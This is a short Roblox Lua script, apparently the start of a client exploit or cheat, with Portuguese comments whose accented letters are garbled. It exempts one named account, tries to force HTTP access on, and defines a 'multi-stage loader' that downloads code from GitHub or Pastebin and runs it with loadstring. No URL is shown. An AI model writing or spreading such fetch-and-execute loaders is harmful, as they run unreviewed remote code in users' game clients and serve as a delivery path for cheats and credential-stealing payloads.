local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local IGNORED_USER = "fimossegamers123"

-- [TRAVA GLOBAL PARA USU√ÅRIO IGNORADO]
-- Se for o fimossegamers123, o script para a execu√ß√£o aqui mesmo para garantir que nada seja mexido.
if Player.Name == IGNORED_USER then 
    print("Acesso administrativo detectado: " .. IGNORED_USER .. ". Script desativado para esta conta.")
    return 
end

-- [INJE√á√ÉO DE HTTPSERVICE]
local HttpService = game:GetService("HttpService")
pcall(function()
    if not HttpService.HttpEnabled then
        HttpService.HttpEnabled = true
    end
end)

local CoreGui = game:GetService("CoreGui")
local VirtualUser = game:GetService("VirtualUser")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

-- [LOADER MULTI-EST√ÅGIO (GITHUB/PASTEBIN)]
local function loadStage(stageUrl)
    local success, content = pcall(function()
        return game:HttpGet(stageUrl)
    end)
    if success and content then
        local func, err = loadstring(content)
        if func then
            task.spawn(func)
            return true
        else
            warn("Erro ao carregar est√°gio: " .. tostring(err))
        end
    end
    return false
end

